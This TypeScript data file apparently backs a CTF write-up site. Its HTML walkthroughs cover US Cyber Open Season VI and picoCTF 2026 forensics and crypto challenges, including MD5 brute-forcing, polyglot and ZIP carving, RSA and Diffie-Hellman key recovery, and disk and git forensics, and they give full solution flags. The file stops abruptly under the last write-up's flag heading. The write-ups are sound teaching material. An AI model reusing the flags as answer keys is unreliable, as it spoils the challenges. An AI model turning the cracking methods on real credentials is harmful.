export type Challenge = {
  slug: string;
  title: string;
  category: 'web' | 'crypto' | 'pwn' | 'rev' | 'forensics' | 'misc' | 'osint';
  description: string;
  content: string; // HTML content of the write-up
};

export type CTFEvent = {
  slug: string;
  name: string;
  date: string;
  endDate?: string;
  description: string;
  teamName: string;
  placement: string;
  totalTeams: number;
  challenges: Challenge[];
};

// ---------------------------------------------------------------------------
// CTF Events & Challenges
// ---------------------------------------------------------------------------

const ctfEvents: CTFEvent[] = [
  // ── US Cyber Open Season VI ──────────────────────────────────────────
  {
    slug: 'us-cyber-open-season-vi',
    name: 'US Cyber Open Season VI',
    date: 'June 2026',
    description: 'Welcome to the US Cyber Open for Season VI! Currently ongoing event.',
    teamName: 'Kyber Tým',
    placement: 'TBD',
    totalTeams: 0,
    challenges: [
      {
        slug: 'oakhash',
        title: 'OakHash',
        category: 'forensics',
        description: 'Professor Oak wants to beef up the security of his Pokémon PC and created OakHash. Can you find the correct combo of Pokémon nature and Gen 1 Pokémon to crack his password?',
        content: `<h2>OakHash — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Professor Oak is really wanting to beef up the security of the PC he uses for Pokemon storage and decided to make a program to generate strong passwords for him. The only problem is that he's a little bit predictable with it, and hes just using basic MD5 as a hashing function. His custom hash type OakHash is just: $oak$&lt;version&gt;$&lt;hex digest&gt;. And all his passwords follow the scheme: SVIUSCG{&lt;nature&gt;_&lt;gen1_pokemon&gt;}."
</blockquote>
<p class="lead">In this challenge, we are tasked with cracking a custom password hash format called <code>OakHash</code>, which wraps a standard MD5 digest of a Pokémon-themed flag.</p>

<h3>Vulnerability Analysis</h3>
<p>The password scheme is structured as:</p>
<pre><code>SVIUSCG{&lt;nature&gt;_&lt;gen1_pokemon&gt;}</code></pre>
<p>We are given the target hash:</p>
<pre><code>$oak$1$753a7277c956277fc6a3bb8e31822b25</code></pre>
<p>Splitting this value by the <code>$</code> delimiter gives us the hash version (<code>1</code>) and the standard MD5 digest (<code>753a7277c956277fc6a3bb8e31822b25</code>).</p>
<p>Because there are only <strong>25 possible Pokémon natures</strong> (e.g. <code>hardy</code>, <code>lonely</code>, <code>brave</code>, etc.) and <strong>151 Generation 1 Pokémon</strong> (e.g. <code>bulbasaur</code>, <code>ivysaur</code>, etc.), the entire search space consists of only:</p>
<p class="font-semibold text-accent text-center my-4 font-mono text-lg">25 natures × 151 Pokémon = 3,775 combinations</p>
<p>A search space of 3,775 combinations is extremely small and can be brute-forced in a fraction of a second using a simple Python script.</p>

<h3>Cracking Script</h3>
<p>We use a Python script to compute the MD5 hash of all possible combinations and compare them against the target digest. For readability, the lists of natures and Pokémon are shortened below:</p>
<pre><code class="language-python">import hashlib

target_hash = "753a7277c956277fc6a3bb8e31822b25"

# Shortened lists (complete lists contain all 25 natures and 151 Pokémon)
pokemon_natures = ["hardy", "lonely", "brave", "adamant", "naughty", ...]
gen_1_pokemon = ["bulbasaur", "ivysaur", "venusaur", "charmander", ..., "mew"]

# Generate all potential combinations in the flag format
combinations = [
    f"SVIUSCG{{{nature}_{pokemon}}}" 
    for nature in pokemon_natures 
    for pokemon in gen_1_pokemon
]

def crack_oak_hash():
    for flag_attempt in combinations:
        # Compute MD5 hex digest of the candidate password
        hashed = hashlib.md5(flag_attempt.encode('utf-8')).hexdigest()
        
        # Check against target hash
        if hashed == target_hash:
            return f"Flag = {flag_attempt}"
            
    return "Nothing found"

print(crack_oak_hash())</code></pre>

<h3>Execution & Flag Recovery</h3>
<p>Running the Python script instantly cracks the hash and yields the flag:</p>
<pre><code class="language-bash">$ python crack.py
Flag = SVIUSCG{adamant_zubat}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{adamant_zubat}</code></pre>`
      },
      {
        slug: 'souvenirs',
        title: 'Souvenirs 🌍',
        category: 'forensics',
        description: 'Every traveler comes home with a bag full of souvenirs. This postcard came back from a long trip around the world. Open it carefully. Some travelers leave more behind a picture than you\'d think.',
        content: `<h2>Souvenirs — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Every traveler comes home with a bag full of souvenirs — some you put on a shelf, some you tuck quietly inside other things so the airport doesn't ask questions. This postcard came back from a long trip around the world. Open it carefully. Some travelers leave more behind a picture than you'd think."
</blockquote>
<p class="lead">In this challenge, we are given a JPEG image file named <code>souvenirs.jpg</code>. Our goal is to analyze the file and extract any hidden files hidden inside its hex structure to recover the flag.</p>

<h3>File Analysis & Polyglots</h3>
<p>In digital forensics, a common technique for hiding data inside images is appending files directly to the end of the image file (after the image data has terminated). This forms a <strong>file polyglot</strong>, a file that can be parsed as multiple different formats depending on the application opening it.</p>
<ul>
  <li><strong>JPEG Renderers:</strong> A JPEG reader parses the file starting from the Start of Image (SOI) marker (<code>FF D8</code>) and stops rendering when it reaches the End of Image (EOI) marker (<code>FF D9</code>). Any bytes appended after <code>FF D9</code> are completely ignored by the image viewer.</li>
  <li><strong>ZIP Archive Utilities:</strong> ZIP archivers scan files from the end to find the ZIP central directory record. Therefore, if a ZIP archive is appended after the JPEG's EOI marker, the file acts as both a valid JPEG image and a valid ZIP file.</li>
</ul>

<h3>Locating the Hidden Zip</h3>
<p>To confirm this structure, we can inspect the file using a hex editor or standard command-line utilities. This is much more intuitive than writing custom detection code.</p>

<h4>Method A: Hex Editor Inspection</h4>
<p>Opening <code>souvenirs.jpg</code> in a hex editor (such as GHex, ImHex, or CyberChef) and scrolling to the bottom reveals the JPEG End of Image marker <code>FF D9</code> at offset <code>0x9aa7</code>. Immediately following it, we see the ASCII bytes <code>PK\x03\x04</code> (hex: <code>50 4b 03 04</code>), which is the standard file signature (magic bytes) for a ZIP archive. We can even see plain-text references to the zipped files like <code>postcards/01_tokyo.txt</code>.</p>

<h4>Method B: Command-Line Analysis</h4>
<p>If we want to inspect the file quickly via the terminal, we can extract printable strings from the file or view its tail hex bytes:</p>
<pre><code class="language-bash"># Extract printable strings from the end of the file
strings souvenirs.jpg | tail -n 10

# Inspect the last few hex lines of the file
hexdump -C souvenirs.jpg | tail -n 20</code></pre>
<p>Both commands will clearly reveal the file paths (e.g., <code>postcards/01_tokyo.txt</code>, <code>postcards/02_marrakech.txt</code>) and the ZIP headers tucked at the end of the image.</p>

<h3>Extraction</h3>
<p>Since the file is a standard JPEG-ZIP polyglot, we can extract the appended ZIP archive using standard command line tools or by writing a simple Python carving script:</p>
<pre><code class="language-bash"># Option 1: Rename the file and let unzip handle it
cp souvenirs.jpg archive.zip
unzip archive.zip -d extracted_files/

# Option 2: Use binwalk to automatically carve files
binwalk -e souvenirs.jpg</code></pre>

<p>Alternatively, we can carve it programmatically in Python:</p>
<pre><code class="language-python">import zipfile

# Carve the ZIP payload
with open("souvenirs.jpg", "rb") as f:
    data = f.read()

eoi_idx = data.find(b"\\xff\\xd9")
zip_data = data[eoi_idx + 2:]

# Save and extract
with open("extracted.zip", "wb") as f_out:
    f_out.write(zip_data)

with zipfile.ZipFile("extracted.zip", "r") as z:
    z.extractall("postcards_extracted")
    print("Extracted:", z.namelist())</code></pre>

<h3>Flag Recovery</h3>
<p>Extracting the ZIP reveals a <code>postcards/</code> directory containing four text files:</p>
<ul>
  <li><code>01_tokyo.txt</code> — Contains souvenir code: <code>7B7B-NOPE</code></li>
  <li><code>02_marrakech.txt</code> — Contains souvenir code: <code>NOT_HERE_KEEP_LOOKING</code></li>
  <li><code>03_iceland.txt</code> — Contains souvenir code: <code>STILL_NOT_HERE</code></li>
  <li><code>04_oman.txt</code> — Contains the flag!</li>
</ul>
<p>Reading the contents of <code>04_oman.txt</code> yields the following text:</p>
<pre><code>From: Mutrah Corniche, Muscat
Weather: warm, salt in the air, gentle breeze off the gulf
Mood: at home

Notes:
- Walked the corniche at sunset. The boats in the harbour looked like they were
  floating on liquid gold.
- The frankincense souq smells like every old story you've ever heard.
- Bought: a small khanjar pendant. Heavier than it looks. Carrying it makes me
  stand a little straighter.

The best souvenirs aren't things. They're the ones you can carry quietly,
the ones nobody else can see.

Here is yours:

    SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}

Safe travels, traveler.</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}</code></pre>`
      },
      {
        slug: 'broken-envelope',
        title: 'Broken Envelope',
        category: 'forensics',
        description: 'Blue Mountain Geotechnical\'s files were partially corrupted by ransomware. Fix the corrupted project archive by repairing the ZIP file headers to recover the site dispatch.',
        content: `<h2>Broken Envelope — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Blue Mountain Geotechnical is a Denver-based soils and rock-mechanics consultancy. A cryptolocker affiliate passed through the firm's file shares and partly corrupted several project archives before IT lead Bela Srivastava pulled the plug. Project engineer Adalyn Proteau needs the site dispatch read before Monday's client meeting."
</blockquote>
<p class="lead">In this challenge, we are provided with a partially corrupted ZIP file. Our task is to analyze its hex structure, identify what is corrupted/missing, repair it, and recover the flag from the archive files.</p>

<h3>ZIP File Structure Analysis</h3>
<p>A standard ZIP archive consists of three main structural components:</p>
<ol>
  <li><strong>Local File Headers (LFH):</strong> Precedes each file's metadata and compressed data. Starts with the magic bytes <code>50 4B 03 04</code>.</li>
  <li><strong>Central Directory:</strong> A collection of Central Directory File Headers (CDFH) at the end of the file listing all archived entries. Starts with the magic bytes <code>50 4B 01 02</code>.</li>
  <li><strong>End of Central Directory (EOCD):</strong> A 22-byte terminal record containing metadata about the Central Directory (size, offset, and number of entries). Starts with the magic bytes <code>50 4B 05 06</code>.</li>
</ol>

<p>Inspecting the provided hex byte array, we find the following offsets:</p>
<ul>
  <li><code>0x000</code>: First LFH (<code>50 4B 03 04</code>) for <code>project_dispatch.txt</code>.</li>
  <li><code>0x0B3</code> (decimal 179): Second LFH (<code>50 4B 03 04</code>) for <code>readme.txt</code>.</li>
  <li><code>0x114</code> (decimal 276): First CDFH (<code>50 4B 01 02</code>) for <code>project_dispatch.txt</code> (size 66 bytes).</li>
  <li><code>0x156</code> (decimal 342): Second CDFH (<code>50 4B 01 02</code>) for <code>readme.txt</code> (size 56 bytes).</li>
</ul>
<p>Tracing the bytes beyond the second CDFH, we notice the file terminates with trailing zero bytes. The crucial <strong>End of Central Directory (EOCD)</strong> record is completely missing. Without it, ZIP parsers cannot locate the Central Directory and will throw a corrupted archive error.</p>

<h3>Rebuilding the EOCD Record</h3>
<p>To repair the archive, we must manually construct and append the 22-byte EOCD record. The fields are mapped as follows (using little-endian format):</p>
<table>
  <thead>
    <tr>
      <th>Field</th>
      <th>Size</th>
      <th>Value (Hex)</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Signature</td>
      <td>4 bytes</td>
      <td><code>50 4B 05 06</code></td>
      <td>EOCD Magic Bytes</td>
    </tr>
    <tr>
      <td>Disk Number</td>
      <td>2 bytes</td>
      <td><code>00 00</code></td>
      <td>Disk 0</td>
    </tr>
    <tr>
      <td>CD Disk Number</td>
      <td>2 bytes</td>
      <td><code>00 00</code></td>
      <td>Disk 0 contains the start of the CD</td>
    </tr>
    <tr>
      <td>Disk CD Entries</td>
      <td>2 bytes</td>
      <td><code>02 00</code></td>
      <td>2 files archived</td>
    </tr>
    <tr>
      <td>Total CD Entries</td>
      <td>2 bytes</td>
      <td><code>02 00</code></td>
      <td>2 files total</td>
    </tr>
    <tr>
      <td>Size of CD</td>
      <td>4 bytes</td>
      <td><code>7A 00 00 00</code></td>
      <td>122 bytes (66 + 56 bytes)</td>
    </tr>
    <tr>
      <td>Offset of CD</td>
      <td>4 bytes</td>
      <td><code>14 01 00 00</code></td>
      <td>Offset 276 (0x114) relative to start of archive</td>
    </tr>
    <tr>
      <td>Comment Length</td>
      <td>2 bytes</td>
      <td><code>00 00</code></td>
      <td>No comment</td>
    </tr>
  </tbody>
</table>

<p>This gives us the following EOCD byte sequence to append:</p>
<pre><code>50 4B 05 06 00 00 00 00 02 00 02 00 7A 00 00 00 14 01 00 00 00 00</code></pre>

<h3>Python Repair Script</h3>
<p>We write a Python script to assemble the corrupted byte array, append our constructed EOCD record, save it as a valid ZIP archive, and extract its contents:</p>
<pre><code class="language-python">import zipfile

# Provided corrupted bytes
arr = bytes([
    0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x05, 0x57,
    0xB1, 0x5C, 0x5F, 0x7D, 0x72, 0xB3, 0x81, 0x00, 0x00, 0x00, 0x88, 0x00,
    # ... [truncated for readability] ...
    0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0xB3, 0x00, 0x00, 0x00, 0x72, 0x65,
    0x61, 0x64, 0x6D, 0x65, 0x2E, 0x74, 0x78, 0x74
])

# Manually constructed EOCD record
eocd = bytes([
    0x50, 0x4B, 0x05, 0x06, # Signature
    0x00, 0x00,             # Number of this disk
    0x00, 0x00,             # Disk where CD starts
    0x02, 0x00,             # CD records on this disk
    0x02, 0x00,             # Total CD records
    0x7A, 0x00, 0x00, 0x00, # Size of central directory (122 bytes)
    0x14, 0x01, 0x00, 0x00, # Offset of start of CD (276 bytes)
    0x00, 0x00              # Comment length
])

# Reassemble and extract
repaired_data = arr + eocd
with open("repaired.zip", "wb") as f:
    f.write(repaired_data)

with zipfile.ZipFile("repaired.zip", "r") as z:
    for name in z.namelist():
        print(f"Content of {name}:")
        print(z.read(name).decode("utf-8"))</code></pre>

<h3>Flag Recovery</h3>
<p>Executing the repair script extracts two files: <code>readme.txt</code> and <code>project_dispatch.txt</code>. The contents of <code>project_dispatch.txt</code> reveal:</p>
<pre><code>Blue Mountain Geotechnical - project dispatch
tag: U1ZJVVNDR3tibHVlbW91bnRhaW5femlwX2VvY2RfcmVidWlsZH0=
site: Sawatch Ridge borehole 17</code></pre>
<p>The tag is encoded in Base64. We decode it to recover the plaintext flag:</p>
<pre><code class="language-bash">$ echo "U1ZJVVNDR3tibHVlbW91bnRhaW5femlwX2VvY2RfcmVidWlsZH0=" | base64 -d
SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>`
      }
    ],
  },

  // ── picoCTF 2026 ─────────────────────────────────────────────────────
  {
    slug: 'picoctf-2026',
    name: 'picoCTF 2026',
    date: 'March 2026',
    description: 'The annual beginner-friendly CTF hosted by Carnegie Mellon University. Played with oveM cek.',
    teamName: 'oveM cek',
    placement: '1630th',
    totalTeams: 10000,
    challenges: [
      {
        slug: 'stegorsa',
        title: 'StegoRSA',
        category: 'crypto',
        description: 'A message has been encrypted using RSA. The public key is gone… but someone might have been careless with the private key. Can you recover it and decrypt the message?',
        content: `<h2>StegoRSA — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A message has been encrypted using RSA. The public key is gone… but someone might have been careless with the private key. Can you recover it and decrypt the message?"</blockquote>
<p class="lead">In this challenge, we are provided with an image file and an encrypted flag file <code>flag.enc</code>. The goal is to locate the hidden private key, convert it, and decrypt the ciphertext to reveal the flag.</p>

<h3>Metadata Extraction</h3>
<p>To begin, we inspect the metadata of the provided image file using <code>exiftool</code>. Scanning the fields, we notice a "Comment" metadata field containing a long hexadecimal string.</p>
<pre><code class="language-bash">$ exiftool image.jpg
...
Comment                         : 2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d...</code></pre>

<h3>Decoding the Private Key</h3>
<p>The hex string in the Comment field represents the ASCII encoding of a PEM-formatted RSA private key. We can extract and decode the raw hex bytes using <code>xxd</code> (or standard hex decoding tools) to write the private key to a file:</p>
<pre><code class="language-bash"># Decode the hex payload back into a PEM key
cat comment.txt | xxd -r -p > key.pem</code></pre>
<p>Opening <code>key.pem</code> shows a standard <code>-----BEGIN RSA PRIVATE KEY-----</code> block, confirming our extraction was successful.</p>

<h3>Decryption</h3>
<p>With the private key recovered, we use OpenSSL's public key utility (<code>pkeyutl</code>) to decrypt the encrypted flag file <code>flag.enc</code>:</p>
<pre><code class="language-bash">openssl pkeyutl -decrypt -inkey key.pem -in flag.enc -out flag.txt</code></pre>
<p>After executing the command, reading <code>flag.txt</code> reveals the plaintext flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{rs4_k3y_1n_1mg_[instance_id]}</code></pre>`
      },
      {
        slug: 'shared-secrets',
        title: 'Shared Secrets',
        category: 'crypto',
        description: 'A message was encrypted using a shared secret... but it looks like one side of the exchange leaked something. Can you piece together the secret and get the flag?',
        content: `<h2>Shared Secrets — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A message was encrypted using a shared secret... but it looks like one side of the exchange leaked something. Can you piece together the secret and get the flag?"</blockquote>
<p class="lead">This challenge simulates a Diffie-Hellman key exchange where a critical implementation flaw and a leaked private key enable us to independently calculate the shared secret and decrypt the flag.</p>

<h3>Diffie-Hellman Parameters</h3>
<p>Diffie-Hellman relies on a public base <code>g</code> and a prime modulus <code>p</code>. Alice computes her public value <code>A = g^a mod p</code> and Bob computes <code>B = g^b mod p</code>. The shared secret <code>S</code> is then computed as:</p>
<p><code>S = A^b mod p = B^a mod p</code></p>
<p>The provided script encrypts the flag using a static XOR key derived from the shared secret:</p>
<p><code>xor_key = shared_secret % 256</code></p>

<h3>Vulnerability Analysis</h3>
<p>In the provided <code>message.txt</code>, we notice that Bob's private integer <code>b</code> was inadvertently logged and leaked. Since we have Bob's private exponent <code>b</code>, Alice's public value <code>A</code>, and the modulus <code>p</code>, we do not need Alice's private key <code>a</code> to calculate the shared secret.</p>

<h3>Exploitation</h3>
<p>We write a Python script to compute the shared secret, derive the single-byte XOR key, and perform the XOR decryption on the encrypted flag bytes:</p>
<pre><code class="language-python"># Recovered parameters
p = [MODULUS_VALUE]
g = [BASE_VALUE]
A = [ALICE_PUBLIC_KEY]
b = [LEAKED_BOB_PRIVATE_KEY]  # The leaked secret

# Calculate the shared secret
shared_secret = pow(A, b, p)
xor_key = shared_secret % 256

# Decrypt the encrypted flag bytes
encrypted_flag = bytes.fromhex("[ENCRYPTED_FLAG_HEX]")
flag = bytes([byte ^ xor_key for byte in encrypted_flag])
print(flag.decode())</code></pre>
<p>Running this script successfully decrypts the ciphertext into the plaintext flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{dh_s3cr3t_[instance_id]}</code></pre>`
      },
      {
        slug: 'binary-digits',
        title: 'Binary Digits',
        category: 'forensics',
        description: "This file doesn't look like much... just a bunch of 1s and 0s. But maybe it's not just random noise. Can you recover anything meaningful from this?",
        content: `<h2>Binary Digits — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"This file doesn't look like much... just a bunch of 1s and 0s. But maybe it's not just random noise. Can you recover anything meaningful from this?"</blockquote>
<p class="lead">This challenge presents us with a file named <code>digits.bin</code> filled entirely with ASCII <code>1</code> and <code>0</code> characters. We must reconstruct the original binary file represented by these bits.</p>

<h3>Data Reconstruction</h3>
<p>The sequence of '1's and '0's represents the raw binary bits of a file. We can write a Python script to group these ASCII bits into 8-bit chunks, convert each chunk to a byte, and write the resulting bytes to a file:</p>
<pre><code class="language-python">with open("digits.bin", "r") as f:
    bits = f.read().replace("\\s", "")  # Strip whitespace

# Convert groups of 8 bits into bytes
data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

with open("recovered_file.jpg", "wb") as f:
    f.write(data)</code></pre>
<p>Alternatively, this can be done in CyberChef using the <strong>"From Binary"</strong> recipe.</p>

<h3>File Analysis</h3>
<p>We analyze the signature (magic bytes) of the recovered file. Checking the hex representation of the first few bytes, we see:</p>
<p><code>FF D8 FF E0</code></p>
<p>These magic bytes correspond to the file signature of a <strong>JPEG image file</strong>. We rename the file to have a <code>.jpg</code> extension and open it.</p>

<h3>Flag Recovery</h3>
<p>Opening the reconstructed JPEG image in any viewer reveals the flag written directly on the image.</p>

<h3>Flag</h3>
<pre><code>picoCTF{h1dd3n_1n_th3_b1n4ry_[instance_id]}</code></pre>`
      },
      {
        slug: 'timeline-1',
        title: 'Timeline 1',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format.',
        content: `<h2>Timeline 1 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format."</blockquote>
<p class="lead">Digital Forensics and Incident Response (DFIR) analysts use chronological event timelines to reconstruct attackers' actions. This challenge tests our ability to generate and analyze file system MACB (Modification, Access, Change, Birth) timelines using The Sleuth Kit (TSK).</p>

<h3>Filesystem Partitioning</h3>
<p>If the provided file is a full disk image, we first identify the partition structure using <code>mmls</code> or <code>fdisk</code> to find the specific partition containing the filesystem. Once targeted, we analyze it using TSK commands.</p>

<h3>Generating the MACB Timeline</h3>
<p>We first generate a raw body file containing metadata and timestamps for every file (allocated and unallocated) on the partition using <code>fls</code>:</p>
<pre><code class="language-bash">fls -r -m / partition.img > body.txt</code></pre>
<p>Next, we compile the body file into a human-readable CSV timeline sorted chronologically using <code>mactime</code>:</p>
<pre><code class="language-bash">mactime -b body.txt > timeline.csv</code></pre>

<h3>Anomalous Event Detection</h3>
<p>Analyzing the timeline, we search for clustered events and anomalous files that were deleted or modified in quick succession. We identify a suspicious file that was deleted right after a shell script or wiping utility was run. We note the inode number of this target file.</p>

<h3>Data Carving</h3>
<p>Even though the file was unlinked and deleted from the directory index, the data blocks on the disk remain intact. We recover the raw file content using <code>icat</code> with the identified inode:</p>
<pre><code class="language-bash">icat partition.img &lt;target_inode&gt; > extracted_file.txt</code></pre>
<p>Reading the extracted file reveals the flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{573417h13r_7h4n_7h3_1457_[instance_id]}</code></pre>`
      },
      {
        slug: 'timeline-0',
        title: 'Timeline 0',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format.',
        content: `<h2>Timeline 0 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format."</blockquote>
<p class="lead">Timestomping is an anti-forensic technique where file metadata timestamps (Modified, Accessed, Changed, Birth) are intentionally modified (using utilities like <code>touch -t</code>) to hide files from basic chronological incident timelines.</p>

<h3>Generating the Timeline</h3>
<p>Similar to standard forensic workflows, we use Sleuth Kit tools to index the filesystem and sort all file events chronologically:</p>
<pre><code class="language-bash"># Generate metadata body file
fls -r -m / partition4.img > output.txt

# Create human-readable sorted timeline
mactime -b output.txt > timeline.txt</code></pre>

<h3>Identifying the Anomaly</h3>
<p>When we sort the timeline and inspect the absolute oldest entries using <code>head timeline.txt</code>, we find a file located at <code>/bin/bcab</code> carrying a timestamp of <strong>January 02, 1985</strong>. This is extremely anomalous for a modern CTF Linux disk image and is a clear indicator of timestomping.</p>

<h3>Data Recovery</h3>
<p>We find the inode number associated with the suspicious <code>/bin/bcab</code> file (e.g., <code>4945</code>). We extract the file content directly from the partition using <code>icat</code>:</p>
<pre><code class="language-bash">icat partition4.img 4945 > bcab.txt</code></pre>
<p>Reading <code>bcab.txt</code> yields the flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{71m311n3_0u7113r_h3r_[instance_id]}</code></pre>`
      },
      {
        slug: 'rogue-tower',
        title: 'Rogue Tower',
        category: 'forensics',
        description: 'A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag.',
        content: `<h2>Rogue Tower — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag."</blockquote>
<p class="lead">This network forensics challenge requires analyzing a packet capture (PCAP) to identify rogue network broadcasts and decode data exfiltrated over non-standard protocols.</p>

<h3>Traffic Analysis</h3>
<p>We open the PCAP file in Wireshark and filter the packets to isolate anomalous traffic. We observe two significant activities:
<ul>
  <li>Frequent UDP broadcasts on port <code>55000</code>.</li>
  <li>Segmented HTTP POST requests containing Base64 payloads sent to an unknown external IP address.</li>
</ul>
</p>

<h3>Device Identification</h3>
<p>To identify the compromised device, we filter for the HTTP POST requests (<code>http.request.method == "POST"</code>) and inspect the HTTP headers. In the <code>User-Agent</code> header, we find details identifying the cellular device along with its IMSI (International Mobile Subscriber Identity) string.</p>

<h3>Payload Decryption</h3>
<p>The exfiltrated data inside the HTTP POST bodies is Base64 encoded. We extract and concatenate all these segments to rebuild the full ciphertext. 
The data is encrypted using a simple XOR cipher, where the key or seed is derived from the device's IMSI. We write a Python script to decrypt the payload using the IMSI as the XOR key:</p>
<pre><code class="language-python"># Concatenated Base64 segments
ciphertext_b64 = "..."
ciphertext = base64.b64decode(ciphertext_b64)

# Key derived from IMSI
imsi_key = b"IMSI_STRING_HERE"

# XOR Decryption
flag = bytes([ciphertext[i] ^ imsi_key[i % len(imsi_key)] for i in range(len(ciphertext))])
print(flag.decode())</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{r0gu3_c3ll_t0w3r_[instance_id]}</code></pre>`
      },
      {
        slug: 'forensics-git-2',
        title: 'Forensics Git 2',
        category: 'forensics',
        description: "The agents interrupted the perpetrator's disk deletion routine. Can you recover this git repo?",
        content: `<h2>Forensics Git 2 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The agents interrupted the perpetrator's disk deletion routine. Can you recover this git repo?"</blockquote>
<p class="lead">This challenge tests deep knowledge of Git internals. When references like branch pointers and reflogs are deleted, the raw Git objects (commits, trees, and blobs) remain compressed in the <code>.git/objects</code> folder as "dangling" or "orphaned" objects until garbage collection is run.</p>

<h3>Object Recovery</h3>
<p>Since standard commands like <code>git log</code> or <code>git reflog</code> fail to list any history, we must inspect the object database directly. Every commit, file state, and tree in Git is compressed using zlib and stored as a hash-addressed file.</p>

<h3>Batch Plumbing Extraction</h3>
<p>Instead of manually unzipping every object in <code>.git/objects/</code>, we can use Git's plumbing command <code>git cat-file</code> with the <code>--batch-all-objects</code> and <code>--batch</code> flags. This tells Git to process and dump the content of every object in the database, bypassing the deleted commit tree:</p>
<pre><code class="language-bash">git cat-file --batch-all-objects --batch | strings > all_objects.txt</code></pre>

<h3>Searching the Flag</h3>
<p>The resulting <code>all_objects.txt</code> file contains the plain-text representations of all commits, files, and metadata. We search this file for the standard flag format:</p>
<pre><code class="language-bash">grep -oE "picoCTF\{.*\}" all_objects.txt</code></pre>
<p>This reveals the flag, which was stored inside one of the dangling blob objects.</p>

<h3>Flag</h3>
<pre><code>picoCTF{g1t_d4ngl1ng_0bj3cts_r3c0v3ry_[instance_id]}</code></pre>`
      },
      {
        slug: 'forensics-git-0',
        title: 'Forensics Git 0',
        category: 'forensics',
        description: 'Can you find the flag in this disk image?',
        content: `<h2>Forensics Git 0 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image?"</blockquote>
<p class="lead">In this introductory Git forensics challenge, we must correctly mount a partition from a raw disk image and explore the repository commit history to recover a deleted secret file.</p>

<h3>Mounting the Disk Partition</h3>
<p>First, we inspect the sector structure of the provided disk image <code>disk.img</code> to find the offset of the primary partition:</p>
<pre><code class="language-bash">fdisk -l disk.img</code></pre>
<p>We calculate the byte offset (<code>Start Sector * Sector Size</code>, usually 512 bytes) and mount the partition read-only to a mount point:</p>
<pre><code class="language-bash">sudo mount -o loop,offset=<calculated_offset> disk.img /mnt/ctf</code></pre>

<h3>Repository Analysis</h3>
<p>We navigate to the mounted directory, finding a repository under <code>/mnt/ctf/home/ctf-player/Code/secrets/.git</code>. Since the repository is intact, standard Git tools are fully functional. We review the commit history and file diffs to see what changes were made:</p>
<pre><code class="language-bash">git log --stat</code></pre>
<p>This shows a commit that removed a file named <code>secret_flag.txt</code>.</p>

<h3>Flag Retrieval</h3>
<p>We checkout the commit prior to the deletion of the file to recover the plaintext flag:</p>
<pre><code class="language-bash">git checkout <commit_hash>
cat secret_flag.txt</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{g1t_h1st0ry_r3v3al_[instance_id]}</code></pre>`
      },
      {
        slug: 'disko-4',
        title: 'DISKO 4',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? This time I deleted the file! Let see you get it now!',
        content: `<h2>DISKO 4 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? This time I deleted the file! Let see you get it now!"</blockquote>
<p class="lead">When files are deleted in an ext4 filesystem, the OS marks their inodes and blocks as unallocated, but the actual data remains intact on disk until overwritten. We can use block-level forensics to recover the file.</p>

<h3>Listing Deleted Files</h3>
<p>We use the Sleuth Kit's <code>fls</code> tool with the <code>-d</code> flag to list only deleted files and directories recursively from the disk image:</p>
<pre><code class="language-bash">fls -r -d disko-4.dd</code></pre>
<p>Looking through the output, we locate the entry for the deleted gzip file:</p>
<p><code>* d/d 532021:   log/dont-delete.gz</code></p>
<p>This tells us the file corresponds to inode <strong>532021</strong>.</p>

<h3>Carving the Inode Blocks</h3>
<p>Using the inode number, we carve the raw blocks associated with it back into a file using <code>icat</code>:</p>
<pre><code class="language-bash">icat disko-4.dd 532021 > recovered.gz</code></pre>

<h3>Decompressing and Reading the Flag</h3>
<p>We decompress the recovered gzip archive and view the extracted file to obtain the flag:</p>
<pre><code class="language-bash">gunzip recovered.gz
cat recovered</code></pre>

<h3>Flag</h3>
